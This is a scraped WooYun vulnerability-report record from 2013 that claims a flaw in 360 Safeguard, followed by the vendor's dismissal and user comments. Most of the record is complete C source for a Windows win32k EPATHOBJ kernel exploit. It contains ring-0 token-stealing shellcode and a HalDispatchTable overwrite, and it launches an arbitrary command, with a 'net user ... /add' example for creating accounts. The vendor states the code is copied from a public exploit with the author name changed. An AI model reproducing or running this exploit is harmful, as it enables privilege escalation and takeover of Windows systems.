{"id": 6428, "wybug_id": "wooyun-2013-041578", "wybug_title": "360卫士主防御存在着危险漏洞", "wybug_corp": "奇虎360", "wybug_author": "雷少", "wybug_date": "2013-10-31 12:52", "wybug_open_date": "2014-01-26 12:53", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-31：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-26：\t细节向公众公开  简要描述： 360无节操，为了测试这次的本地攻击我自己的系统也废了。忘开影子系统此节操通杀xp 2003 win7 干掉QQ 360等主流软件 详细说明：  攻击源码\n#include <stdio.h>#include <STDARG.H>#include <stddef.h>#include <windows.h>//#include <ntstatus.h>#pragma comment(lib, \"gdi32\")#pragma comment(lib, \"kernel32\")#pragma comment(lib, \"user32\")#define MAX_POLYPOINTS (8192 * 3)#define MAX_REGIONS 8192#define CYCLE_TIMEOUT 10000#pragma comment(linker, \"/SECTION:.text,ERW\")//// win32k!EPATHOBJ::pprFlattenRec uninitialized Next pointer testcase.//// Tavis Ormandy <taviso () cmpxchg8b com>, March 2013//POINT       Points[MAX_POLYPOINTS];BYTE        PointTypes[MAX_POLYPOINTS];HRGN        Regions[MAX_REGIONS];ULONG       NumRegion = 0;HANDLE      Mutex;// Log levels.typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;VOID LogInit();VOID LogRelase();BOOL LogMessage(LEVEL Level, PCHAR Format, ...);// Copied from winddi.h from the DDK#define PD_BEGINSUBPATH   0x00000001#define PD_ENDSUBPATH     0x00000002#define PD_RESETSTYLE     0x00000004#define PD_CLOSEFIGURE    0x00000008#define PD_BEZIERS        0x00000010#define ENABLE_SWITCH_DESKTOP\t1typedef struct  _POINTFIX{    ULONG x;    ULONG y;} POINTFIX, *PPOINTFIX;// Approximated from reverse engineering.typedef struct _PATHRECORD {    struct _PATHRECORD *next;    struct _PATHRECORD *prev;    ULONG               flags;    ULONG               count;    POINTFIX            points[4];} PATHRECORD, *PPATHRECORD;PPATHRECORD PathRecord;PATHRECORD  ExploitRecord = {0};PPATHRECORD ExploitRecordExit;typedef struct _RTL_PROCESS_MODULE_INFORMATION {    HANDLE Section;                 // Not filled in    PVOID MappedBase;    PVOID ImageBase;    ULONG ImageSize;    ULONG Flags;    USHORT LoadOrderIndex;    USHORT InitOrderIndex;    USHORT LoadCount;    USHORT OffsetToFileName;    UCHAR  FullPathName[ 256 ];} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;typedef struct _RTL_PROCESS_MODULES {    ULONG NumberOfModules;    RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;typedef ULONG ( __stdcall *NtQueryIntervalProfile_ ) ( ULONG, PULONG );typedef ULONG ( __stdcall *NtQuerySystemInformation_ ) ( ULONG, PVOID, ULONG, PULONG );typedef ULONG ( __stdcall *NtAllocateVirtualMemory_ ) ( HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG );typedef ULONG ( __stdcall *NtFreeVirtualMemory_)( HANDLE, PVOID, PULONG, ULONG);NtQueryIntervalProfile_  NtQueryIntervalProfile;NtAllocateVirtualMemory_ NtAllocateVirtualMemory;NtQuerySystemInformation_ NtQuerySystemInformation;NtFreeVirtualMemory_ NtFreeVirtualMemory;ULONG    PsInitialSystemProcess, PsReferencePrimaryToken, \t\t PsGetThreadProcess, WriteToHalDispatchTable, FixAddress;void _declspec(naked) ShellCode(){    __asm    {\t\t\tpushad\t\t\tpushfd\t\t\tmov esi,PsReferencePrimaryTokenFindTokenOffset:\t\t\tlodsb\t\t\tcmp al, 8Dh;\t\t\tjnz FindTokenOffset\t\t\tmov edi,[esi+1]\t\t\tmov esi,PsInitialSystemProcess\t\t\tmov esi,[esi]\t\t\tpush fs:[124h]\t\t\tmov eax,PsGetThreadProcess\t\t\tcall eax\t\t\tadd esi, edi\t\t\tpush esi\t\t\tadd edi, eax\t\t\tmovsd\t\t\t\t\t\t;add token ref count.\t\t\tpop esi\t\t\tmov esi, [esi]\t\t\tand esi, 0xFFFFFFF8\t\t\tlea eax, [esi-0x18]\t\t\tmov DWORD PTR [eax], 0x016B00B5\t\t\t;fix the haltable\t\t\tmov eax, WriteToHalDispatchTable\t\t\tmov ecx, FixAddress\t\t\tmov [ecx], 0xC3\t\t\tmov DWORD PTR [eax], ecx\t\t\tpopfd\t\t\tpopad\t\t\t;set ret code for NtQueryIntervalProfile\t\t\tmov eax, [esp+0xc]\t\t\tmov DWORD PTR [eax+4], 1\t\t\tmov DWORD PTR [eax+8], 0xC0000018\t\t\txor eax, eax\t\t\tret    }}DWORD WINAPI WatchdogThread(LPVOID Parameter){\t//    // This routine waits for a mutex object to timeout, then patches the    // compromised linked list to point to an exploit. We need to do this.    //\tLogMessage(L_INFO, \"Watchdog thread %d waiting on Mutex\", GetCurrentThreadId());\t    if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT) {\t\t\t\t//        // It looks like the main thread is stuck in a call to FlattenPath(),        // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean        // up, and then patch the list to trigger our exploit.        //\t\twhile (NumRegion--)            DeleteObject(Regions[NumRegion]);\t\t        LogMessage(L_ERROR, \"InterlockedExchange(0x%08x, 0x%08x);\", &PathRecord->next, &ExploitRecord);\t\t        InterlockedExchange((PLONG)&PathRecord->next, (LONG)&ExploitRecord);\t\t    } else {        LogMessage(L_ERROR, \"Mutex object did not timeout, list not patched\");    }\t    return 0;}void wellcome(){\tprintf(\"\\t\\tthe win32k.sys EPATHOBJ 0day exploit\\n\");\tprintf(\"*******************************************************************\\n\");\tprintf(\"***\\texploit by:<progmboy> <雷少>\\t\\t***\\n\");\tprintf(\"***\\t0day finder:<Tavis Ormandy> <雷少>\\t***\\n\");\tprintf(\"***\\ttested system:xp/2003/win7/2008 (*32bit*)\\t\\t***\\n\");\tprintf(\"*******************************************************************\\n\");}void usage(){\tprintf(\"\\nusage:\\n<app> <cmd> <parameter>\\n\");\tprintf(\"example:\\napp.exe net \\\"user 111 111 /add\\\"\");}BOOL FindAFixAddress(\tULONG NtoskrnlBase){\tFixAddress = NtoskrnlBase + FIELD_OFFSET(IMAGE_DOS_HEADER, e_res2);\tLogMessage(L_INFO, \"Get FixAddress --> 0x%08x\", FixAddress);\treturn TRUE;}// 0x602464FF; /*jmp esp+0x60*/// 0x51C3686A; /*push 0; ret*/DWORD CheckMagicDword(){\tOSVERSIONINFOEX OSVer;\tDWORD dwMagic = 0;    OSVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);    if(GetVersionEx((OSVERSIONINFO *)&OSVer)){\t\tswitch(OSVer.dwMajorVersion){\t\tcase 5:\t\t\tdwMagic = 0x602464FF;\t\t\tbreak;\t\tcase 6:\t\t\tdwMagic = 0x642464FF;\t\t\tbreak;\t\tdefault:\t\t\tdwMagic = 0;\t\t}\t}\treturn dwMagic;}int main(int argc, char **argv){    HANDLE      Thread;    HDC         Device;    ULONG       Size;    ULONG       PointNum;\tint nret = 0;\t\tDWORD MAGIC_DWORD = CheckMagicDword();    ULONG AllocSize = 0x1000, status, NtoskrnlBase;\tRTL_PROCESS_MODULES  module;\tHMODULE ntoskrnl = NULL;\tDWORD dwFix;\tULONG Address = MAGIC_DWORD & 0xFFFFF000;\tLONG ret;\tBOOL bRet = FALSE;#ifdef ENABLE_SWITCH_DESKTOP\tHDESK hDesk;#endif    HMODULE  ntdll = GetModuleHandle( \"ntdll.dll\" );\t\twellcome();\tif (argc < 2){\t\tusage();\t\treturn -1;\t}\tif (!MAGIC_DWORD){\t\tLogMessage(L_ERROR, \"unsupported system version\\n\");\t\treturn -1;\t}\tLogInit();\tNtQueryIntervalProfile    =  (NtQueryIntervalProfile_)GetProcAddress( ntdll ,\"NtQueryIntervalProfile\" );    NtAllocateVirtualMemory    =  (NtAllocateVirtualMemory_)GetProcAddress( ntdll ,\"NtAllocateVirtualMemory\" );    NtQuerySystemInformation  =  (NtQuerySystemInformation_)GetProcAddress( ntdll ,\"NtQuerySystemInformation\" );\tNtFreeVirtualMemory =  (NtFreeVirtualMemory_)GetProcAddress( ntdll ,\"NtFreeVirtualMemory\" );    if ( !NtQueryIntervalProfile || !NtAllocateVirtualMemory || \t\t !NtQuerySystemInformation || !NtFreeVirtualMemory){\t\tLogMessage(L_ERROR, \"get function address error\\n\");\t\tLogRelase();\t\treturn -1;\t}\t\t//\t// try to allocate memory.\t//\twhile (TRUE){\t\tret = NtAllocateVirtualMemory( (HANDLE)-1, &Address, 0, &AllocSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );\t\tif(ret < 0){\t\t\tMEMORY_BASIC_INFORMATION meminfo;\t\t\tLogMessage(L_ERROR, \"allocate memory error code 0x%08x\", ret);\t\t\tLogMessage(L_INFO, \"try to free memory\");\t\t\tif(VirtualQuery((LPVOID)Address, &meminfo, sizeof(meminfo))){\t\t\t\tLogMessage(L_INFO, \"meminfo state %d %d\\n\", meminfo.State, meminfo.Protect);\t\t\t}\t\t\tret = NtFreeVirtualMemory((HANDLE)-1, &Address, &AllocSize, MEM_RELEASE);\t\t\tif (ret < 0){\t\t\t\tLogMessage(L_ERROR, \"free memory error code 0x%08x\", ret);\t\t\t\tLogRelase();\t\t\t\treturn -1;\t\t\t}\t\t}else{\t\t\tbreak;\t\t}\t}\t\t//\t// get the kernel info\t//    status = NtQuerySystemInformation( 11, &module, sizeof(RTL_PROCESS_MODULES), NULL);//SystemModuleInformation 11    if ( status != 0xC0000004 ){\t\tLogMessage(L_ERROR, \"NtQuerySystemInformation error code:0x%08x\\n\", status);        LogRelase();\t\treturn -1;\t}\t    NtoskrnlBase     =  (ULONG)module.Modules[0].ImageBase;\t    //    // 把ntoskrnl.exe加载进来    //\t    ntoskrnl = LoadLibraryA( (LPCSTR)( module.Modules[0].FullPathName + module.Modules[0].OffsetToFileName ) );    if (ntoskrnl == NULL){\t\tLogMessage(L_ERROR, \"LoadLibraryA error code:0x%08x\\n\", GetLastError());        LogRelase();\t\treturn -1;\t}\t     //    // 计算实际地址    //\t    WriteToHalDispatchTable =  (ULONG)GetProcAddress(ntoskrnl,\"HalDispatchTable\") - (ULONG)ntoskrnl + NtoskrnlBase + 4;    PsInitialSystemProcess =  (ULONG)GetProcAddress(ntoskrnl,\"PsInitialSystemProcess\") - (ULONG)ntoskrnl + NtoskrnlBase;    PsReferencePrimaryToken = (ULONG)GetProcAddress(ntoskrnl,\"PsReferencePrimaryToken\") - (ULONG)ntoskrnl + NtoskrnlBase;    PsGetThreadProcess =  (ULONG)GetProcAddress(ntoskrnl,\"PsGetThreadProcess\") - (ULONG)ntoskrnl + NtoskrnlBase;\t\tif(!FindAFixAddress(NtoskrnlBase)){\t\tLogMessage(L_ERROR, \"Can not Find A Fix Address\\n\");\t\tnret = -1;\t\tgoto __end;\t}\t//    // Create our PATHRECORD in user space we will get added to the EPATHOBJ    // pathrecord chain.    //\tPathRecord = (PPATHRECORD)VirtualAlloc(NULL,                              sizeof(PATHRECORD),                              MEM_COMMIT | MEM_RESERVE,                              PAGE_EXECUTE_READWRITE);    LogMessage(L_INFO, \"Alllocated userspace PATHRECORD () %p\", PathRecord);\t\t//    // Initialize with recognizable debugging values.    //\tFillMemory(PathRecord, sizeof(PATHRECORD), 0xCC);    PathRecord->next    = PathRecord;    PathRecord->prev    = (PPATHRECORD)(0x42424242);\t\t//    // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from    // EPATHOBJ::bFlatten(). We don't set it so that we can trigger an infinite    // loop in EPATHOBJ::bFlatten().    //\tPathRecord->flags   = 0;    LogMessage(L_INFO, \"  ->next  @ %p\", PathRecord->next);    LogMessage(L_INFO, \"  ->prev  @ %p\", PathRecord->prev);    LogMessage(L_INFO, \"  ->flags @ %u\", PathRecord->flags);\t\tExploitRecordExit = (PPATHRECORD)MAGIC_DWORD;\tExploitRecordExit->next = NULL;\tExploitRecordExit->next = NULL;\tExploitRecordExit->flags = PD_BEGINSUBPATH;\tExploitRecordExit->count = 0;\t\tExploitRecord.next  = (PPATHRECORD)MAGIC_DWORD;    ExploitRecord.prev  = (PPATHRECORD)WriteToHalDispatchTable;    ExploitRecord.flags = PD_BEZIERS | PD_BEGINSUBPATH;\tExploitRecord.count = 4;\t    LogMessage(L_INFO, \"Creating complex bezier path with %x\", (ULONG)(PathRecord) >> 4);\t\t//    // Generate a large number of Belier Curves made up of pointers to our    // PATHRECORD object.    //\tfor (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {        Points[PointNum].x      = (ULONG)(PathRecord) >> 4;        Points[PointNum].y      = (ULONG)(PathRecord) >> 4;        PointTypes[PointNum]    = PT_BEZIERTO;    }\t//    // Switch to a dedicated desktop so we don't spam the visible desktop with    // our Lines (Not required, just stops the screen from redrawing slowly).    //#ifdef ENABLE_SWITCH_DESKTOP\thDesk = CreateDesktop( \"DontPanic\",\t\t\t\t\t\t\tNULL,\t\t\t\t\t\t\tNULL,\t\t\t\t\t\t\t0,\t\t\t\t\t\t\tGENERIC_ALL,\t \t\t\t\t\t\tNULL);\tif (hDesk){\t\tSetThreadDesktop(hDesk);\t}#endif\t\twhile (TRUE){\t\tBOOL bBreak = FALSE;\t\tMutex = CreateMutex(NULL, TRUE, NULL);\t\tif (!Mutex){\t\t\tLogMessage(L_INFO, \"Allocated %u HRGN objects\", NumRegion);\t\t\tnret = -1;\t\t\tgoto __end;\t\t}\t\t\t\t//\t\t// Get a handle to this Desktop.\t\t//\t\tDevice = GetDC(NULL);\t\t\t\t//\t\t// Spawn a thread to cleanup\t\t//\t\tThread = CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\t\t\t\tLogMessage(L_INFO, \"start CreateRoundRectRgn\");\t\t\t\t//\t\t// We need to cause a specific AllocObject() to fail to trigger the\t\t// exploitable condition. To do this, I create a large number of rounded\t\t// rectangular regions until they start failing. I don't think it matters\t\t// what you use to exhaust paged memory, there is probably a better way.\t\t//\t\t// I don't use the simpler CreateRectRgn() because it leaks a GDI handle on\t\t// failure. Seriously, do some damn QA Microsoft, wtf.\t\t//\t\tfor (Size = 1 << 26; Size; Size >>= 1) {\t\t\twhile (TRUE){\t\t\t\tHRGN hm = CreateRoundRectRgn(0, 0, 1, Size, 1, 1);\t\t\t\tif (!hm){\t\t\t\t\tbreak;\t\t\t\t}\t\t\t\tif (NumRegion < MAX_REGIONS){\t\t\t\t\tRegions[NumRegion] = hm;\t\t\t\t\tNumRegion++;\t\t\t\t}else{\t\t\t\t\tNumRegion = 0;\t\t\t\t}\t\t\t}\t\t}\t\tLogMessage(L_INFO, \"Allocated %u HRGN objects\", NumRegion);\t\tLogMessage(L_INFO, \"Flattening curves...\");\t\t\t\t//\t\t// Begin filling the free list with our points.\t\t//\t\t\t\tdwFix = *(PULONG)ShellCode;\t\tfor (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3) {\t\t\tBeginPath(Device);\t\t\tPolyDraw(Device, Points, PointTypes, PointNum);\t\t\tEndPath(Device);\t\t\tFlattenPath(Device);\t\t\tFlattenPath(Device);\t\t\t\t\t\t//\t\t\t// call the function to exploit.\t\t\t//\t\t\tret = NtQueryIntervalProfile(2, (PULONG)ShellCode);\t\t\t\t\t\t//\t\t\t// we will set the status with 0xC0000018 in ring0 shellcode.\t\t\t//\t\t\tif (*(PULONG)ShellCode == 0xC0000018){\t\t\t\tbRet = TRUE;\t\t\t\tbreak;\t\t\t}\t\t\t\t\t\t//\t\t\t// fix\t\t\t//\t\t\t\t\t\t*(PULONG)ShellCode = dwFix;\t\t\tEndPath(Device);\t\t}\t\t\t\tif (bRet){\t\t\tLogMessage(L_INFO, \"Exploit ok run command\");\t\t\tShellExecute( NULL, \"open\", argv[1], argc > 2 ? argv[2] : NULL, NULL, SW_SHOW);\t\t\tbBreak = TRUE;\t\t}else{\t\t\tLogMessage(L_INFO, \"No luck, cleaning up. and try again..\");\t\t}    \t\t//\t\t// If we reach here, we didn't trigger the condition. Let the other thread know.\t\t//\t\tReleaseMutex(Mutex);\t\t\t\tReleaseDC(NULL, Device);\t\tWaitForSingleObject(Thread, INFINITE);\t\tif (bBreak){\t\t\tbreak;\t\t}\t}__end:\tLogRelase();\tif (ntoskrnl)\t\tFreeLibrary(ntoskrnl);#ifdef ENABLE_SWITCH_DESKTOP\tif (hDesk){\t\tCloseHandle(hDesk);\t}#endif    return nret;}CRITICAL_SECTION gCSection;VOID LogInit(){\tInitializeCriticalSection(&gCSection);}VOID LogRelase(){\tDeleteCriticalSection(&gCSection);}//// A quick logging routine for debug messages.//BOOL LogMessage(LEVEL Level, PCHAR Format, ...){    CHAR Buffer[1024] = {0};    va_list Args;\t\tEnterCriticalSection(&gCSection);    va_start(Args, Format);    _snprintf(Buffer, sizeof(Buffer), Format, Args);    va_end(Args);    switch (Level) {        case L_DEBUG: fprintf(stdout, \"[?] %s\\n\", Buffer); break;        case L_INFO:  fprintf(stdout, \"[+] %s\\n\", Buffer); break;        case L_WARN:  fprintf(stderr, \"[*] %s\\n\", Buffer); break;        case L_ERROR: fprintf(stderr, \"[!] %s\\n\", Buffer); break;    }\t    fflush(stdout);    fflush(stderr);\t\tLeaveCriticalSection(&gCSection);    return TRUE;}\n测试方法：\n\n任意一个进程\n\n执行后360的功能全废了\n\n\n\n\n\n   漏洞证明：  \n\n调用了某牛的程序   修复方案：  你们好专业   版权声明：转载请注明来源 雷少@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-01-26 12:53 厂商回复： 此报告中的问题的并非是360的安全漏洞，是一个今年3月已经公开的微软Winodows内核漏洞，而且在今年7月已经修复，且相关攻击代码早已公开，此报告中的代码即是由已经在看雪论坛在今年6月公开的攻击代码基础上照抄和修改了作者名的结果，看雪上的代码链接为：http://bbs.pediy.com/showthread.php?t=172839此攻击代码公开后，360在5天内全球首家提供了针对此攻击的防御临时补丁版本：http://bbs.360safe.com/thread-1695687-1-1.html带有临时补丁版本的下载地址：http://dl.360safe.com/setupbeta_9.2.0.1002z.exe此临时补丁可以防御这个当时的0day漏洞的攻击在今年7月的补丁日，微软发布了针对此漏洞的安全补丁：http://blogs.technet.com/b/msrc/archive/2013/07/04/advance-notification-service-for-july-2103-security-bulletin-release.aspx在用户升级了微软补丁后，相关临时补丁在360防御中已经撤销，用户按360提示安装补丁后即可彻底对此漏洞的攻击免疫。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-31 12:55 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  厂家忽略，漏洞细节向公众公开    \n     2013-10-31 13:05 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  厂家忽略，漏洞细节向公众公开    \n     2013-10-31 13:07 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  2000k    \n     2013-10-31 13:09 |    \t\tMoogong \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 伪法医)\t\t \n  >20rank    \n     2013-10-31 13:28 |    \t\t雷少 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:31        | 热爱网络的爱好者，需求同道中人。)\t\t \n  等待360回复呢    \n     2013-10-31 13:30 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  雷老板 拿钱了请客    \n     2013-10-31 13:31 |    \t\t雷少 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:31        | 热爱网络的爱好者，需求同道中人。)\t\t \n  人家都没表态呢    \n     2013-10-31 14:04 |    \t\t雷锋小号 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云现在就缺我这种默默顶贴从来不求脸熟的...)\t\t \n  目测会火，前排留名    \n     2013-10-31 15:15 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  360补丁不是自动的么 洞主没安装？    \n     2013-10-31 16:05 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @xsser xsser = = 看到详情了吗 透露啊 我很想知道    \n     2013-10-31 20:55 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xsser 公开吧，如果真的没影响    \n     2013-10-31 21:40 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @雷少 @xsser 太让我失望了 不过我很喜欢360解释洞的态度    \n     2013-11-01 07:38 |    \t\tJumbo小号 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | Jumbo小弟，我们兄弟遍布五湖四海。。。)\t\t \n  @雷少果断是破WAF达人哈    \n     2013-11-01 09:18 |    \t\t雷少 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:31        | 热爱网络的爱好者，需求同道中人。)\t\t \n  @xsser 360默认是没有提示用户安装补丁的    \n     2013-11-01 16:58 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  360 不是自动打补丁的么    \n     2013-11-02 15:30 |    \t\t流星warden \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:8        | The quieter you become,the more you are ...)\t\t \n  我喜欢这个厂商回复的态度     \n     2013-11-03 13:44 |    \t\t末笔丶 \t\t\t( 普通白帽子  |\t\t\t        Rank:191 漏洞数:41        | 有阴影的地方必定有光.)\t\t \n  我喜欢360的回复态度。至少会说明原因，让提交漏洞的白帽子对自己提交的漏洞有理解，不会到头来给忽略了都不知道什么原因    \n     2013-11-03 19:19 |    \t\tYHHK \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:5        | love hacker!love technology!)\t\t \n  一看就是64位那个蹩脚洞，其实和360没什么关系    \n     2014-01-26 13:39 |    \t\t三只小潴 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:3        | 纯属小白，求大牛关注。。。)\t\t \n  此攻击代码公开后，360在5天内全球首家提供了针对此攻击的防御临时补丁版本回复也不忘装X。。。    \n     2014-01-26 14:45 |    \t\tStranger \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 我注意你很久了.....)\t\t \n  厂商罗列的很有水准,消除了俺的担忧....    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}